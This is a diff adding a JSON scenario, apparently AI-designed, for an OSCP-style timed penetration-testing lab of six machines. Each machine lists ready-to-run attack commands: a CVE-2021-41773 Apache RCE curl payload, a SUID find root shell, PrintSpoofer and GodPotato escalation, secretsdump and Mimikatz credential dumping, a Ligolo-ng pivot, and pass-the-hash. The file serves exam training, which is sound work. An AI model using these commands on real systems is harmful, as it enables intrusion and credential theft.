@@ -1,0 +1,180 @@
+{
+  "id": "the-clock-is-ticking",
+  "title": "The Clock Is Ticking",
+  "category": "exam-simulation",
+  "source": ["AI-designed"],
+  "designed_by": "ai-composite",
+  "description": "Time pressure scenario: 3 AD (standard chain) + 3 standalone (quick wins: default creds, known CVE, easy SUID). Optimized for speed. 6 machines, 2 networks, AD, pivot.",
+
+  "introduction": "Under time pressure, grab quick wins first—default creds, known CVEs, easy SUID. This scenario trains speed and prioritization.",
+  "mental_model": "Think: quick wins before deep dives. Standalone machines often have low-hanging fruit; AD chain takes longer.",
+  "key_principles": [
+    "Try default creds (root:root, admin:admin) first",
+    "Known CVEs (e.g. CVE-2021-41773) are fast",
+    "SUID find/bash is instant root on some boxes",
+    "Parallelize: AD chain + standalone in parallel",
+    "Document as you go; don't re-enumerate"
+  ],
+
+  "indicators": {
+    "difficulty": 5,
+    "cognitive_load": 5,
+    "enumeration_depth": 4,
+    "rabbit_hole_risk": 4,
+    "time_pressure": 9
+  },
+
+  "mitre": {
+    "tactics": ["TA0001", "TA0003", "TA0004", "TA0006", "TA0007"],
+    "techniques": [
+      {"id": "T1078", "name": "Valid Accounts"},
+      {"id": "T1134.001", "name": "Token Impersonation/Theft"},
+      {"id": "T1190", "name": "Exploit Public-Facing Application"},
+      {"id": "T1068", "name": "Exploitation for Privilege Escalation"}
+    ]
+  },
+
+  "kill_chain_phases": ["T1-Recon", "T2-Web-Access", "T3-NonWeb-Access", "T4a-Linux-PrivEsc", "T4b-Win-PrivEsc", "T5-Credentials", "T6-Pivoting", "T7-Lateral"],
+
+  "environment": {
+    "machine_count": 6,
+    "network_count": 2,
+    "os_distribution": {"windows": 4, "linux": 2},
+    "has_ad": true,
+    "has_pivoting": true,
+    "has_client_side": false
+  },
+
+  "technique_tags": [
+    "default-creds", "cve", "suid", "printspoofer",
+    "quick-win", "time-management"
+  ],
+
+  "exam_relevance": {
+    "oscp_exam_format": true,
+    "pen200_modules": [6, 12, 16, 17, 18, 22],
+    "pattern_frequency": "high",
+    "recommended_order": 15
+  },
+
+  "prerequisites": [],
+  "builds_on": [],
+
+  "networks": [
+    {"id": "external", "cidr": "192.168.30.0/24", "label": "External"},
+    {"id": "internal", "cidr": "10.10.45.0/24", "label": "AD Internal"}
+  ],
+
+  "machines": [
+    {
+      "id": "ad1",
+      "label": "AD1",
+      "ip": "192.168.30.10",
+      "os": "Windows",
+      "role": "AD Entry (dual-NIC)",
+      "networks": ["external", "internal"],
+      "services": [
+        {"port": 5985, "name": "WinRM", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Given creds", "leads_to": "local-user"}], "commands": ["evil-winrm -i 192.168.30.10 -u svc_time -p '<password>'"]},
+        {"port": 445, "name": "SMB", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Given creds", "leads_to": "local-user"}], "commands": []}
+      ],
+      "privesc": [{"from": "svc_time", "to": "SYSTEM", "technique": "PrintSpoofer", "commands": ["PrintSpoofer64.exe -i -c cmd"]}],
+      "credentials": [{"user": "sql_svc", "type": "password", "source": "secretsdump", "unlocks": ["ad2"]}],
+      "alternatives": []
+    },
+    {
+      "id": "ad2",
+      "label": "AD2",
+      "ip": "10.10.45.11",
+      "os": "Windows",
+      "role": "AD Member",
+      "networks": ["internal"],
+      "services": [
+        {"port": 1433, "name": "MSSQL", "version": "", "vulnerabilities": [{"type": "auth", "summary": "MSSQL with sql_svc", "leads_to": "xp_cmdshell"}], "commands": ["impacket-mssqlclient domain/sql_svc:'<password>'@10.10.45.11 -windows-auth"]},
+        {"port": 5985, "name": "WinRM", "version": "", "vulnerabilities": [{"type": "pth", "summary": "WinRM with admin hash", "leads_to": "local-user"}], "commands": []}
+      ],
+      "privesc": [{"from": "sql_svc", "to": "SYSTEM", "technique": "GodPotato", "commands": ["GodPotato-NET4.exe -cmd \"cmd /c whoami\""]}],
+      "credentials": [{"user": "Administrator", "type": "ntlm-hash", "source": "Mimikatz", "unlocks": ["dc-time"]}],
+      "alternatives": []
+    },
+    {
+      "id": "dc-time",
+      "label": "DC-TIME",
+      "ip": "10.10.45.5",
+      "os": "Windows",
+      "role": "Domain Controller",
+      "networks": ["internal"],
+      "services": [
+        {"port": 5985, "name": "WinRM", "version": "", "vulnerabilities": [{"type": "pth", "summary": "PtH with DA hash", "leads_to": "domain-admin"}], "commands": ["evil-winrm -i 10.10.45.5 -u Administrator -H '<hash>'"]},
+        {"port": 389, "name": "LDAP", "version": "", "vulnerabilities": [], "commands": []}
+      ],
+      "privesc": [],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "quick1",
+      "label": "QUICK1",
+      "ip": "192.168.30.20",
+      "os": "Linux",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 22, "name": "SSH", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Default creds root:root", "leads_to": "root"}], "commands": ["ssh root@192.168.30.20"]},
+        {"port": 80, "name": "HTTP", "version": "", "vulnerabilities": [{"type": "auth", "summary": "admin:admin", "leads_to": "recon"}], "commands": []}
+      ],
+      "privesc": [],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "quick2",
+      "label": "QUICK2",
+      "ip": "192.168.30.21",
+      "os": "Linux",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 80, "name": "HTTP", "version": "Apache 2.4.49", "vulnerabilities": [{"type": "rce", "cve": "CVE-2021-41773", "summary": "Path traversal RCE", "leads_to": "www-data"}], "commands": [{"cmd": "curl 'http://192.168.30.21/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo;id'", "rationale": "Why: CVE-2021-41773 path traversal = instant RCE"}]},
+        {"port": 22, "name": "SSH", "version": "", "vulnerabilities": [{"type": "auth", "summary": "SSH after RCE", "leads_to": "local-user"}], "commands": []}
+      ],
+      "privesc": [{"from": "www-data", "to": "root", "technique": "SUID find", "commands": ["find / -perm -4000 2>/dev/null", {"cmd": "find . -exec /bin/bash -p \\; -quit", "rationale": "Why: SUID find runs bash with root privileges"}]}],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "quick3",
+      "label": "QUICK3",
+      "ip": "192.168.30.22",
+      "os": "Windows",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 5985, "name": "WinRM", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Weak creds", "leads_to": "local-user"}], "commands": ["evil-winrm -i 192.168.30.22 -u admin -p 'Password1'"]},
+        {"port": 445, "name": "SMB", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Same weak creds", "leads_to": "local-user"}], "commands": []}
+      ],
+      "privesc": [{"from": "admin", "to": "SYSTEM", "technique": "PrintSpoofer", "commands": ["PrintSpoofer64.exe -i -c cmd"]}],
+      "credentials": [],
+      "alternatives": []
+    }
+  ],
+
+  "connections": [
+    {"from": "ad1", "to": "ad2", "technique": "Ligolo-ng pivot + secretsdump", "requires": "SYSTEM on AD1 (dual-NIC)", "pivot": "AD1 dual-NIC", "path_ids": ["path-ad"], "commands": [
+      "ligolo-ng agent -connect <kali>:11601 -ignore-cert",
+      "# On Kali proxy: session → ifconfig → ip route add 10.10.45.0/24 dev ligolo",
+      {"cmd": "impacket-secretsdump domain/svc_time:'<password>'@192.168.30.10", "rationale": "Why: Dump all hashes for fast lateral movement"},
+      "impacket-mssqlclient domain/sql_svc:'<password>'@10.10.45.11 -windows-auth"
+    ]},
+    {"from": "ad2", "to": "dc-time", "technique": "Pass-the-Hash with DA NTLM", "requires": "DA hash from Mimikatz on AD2", "pivot": "AD1", "path_ids": ["path-ad"], "commands": [
+      "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
+      "evil-winrm -i 10.10.45.5 -u Administrator -H '<ntlm_hash>'"
+    ]}
+  ],
+
+  "attack_paths": [
+    {"id": "path-ad", "name": "AD: Standard Chain", "color": "#6bb8cc", "steps": ["ad1", "ad2", "dc-time"], "description": "Given creds → PrintSpoofer → Kerberoast/Mimikatz → MSSQL → GodPotato → DA"},
+    {"id": "path-quick1", "name": "QUICK1: Default creds", "color": "#e8a87c", "steps": ["quick1"], "description": "root:root SSH → instant root"},
+    {"id": "path-quick2", "name": "QUICK2: CVE-2021-41773", "color": "#85e89d", "steps": ["quick2"], "description": "Apache path traversal RCE → SUID find"},
+    {"id": "path-quick3", "name": "QUICK3: Weak creds", "color": "#d2a8ff", "steps": ["quick3"], "description": "admin:Password1 → PrintSpoofer"}
+  ]
+}
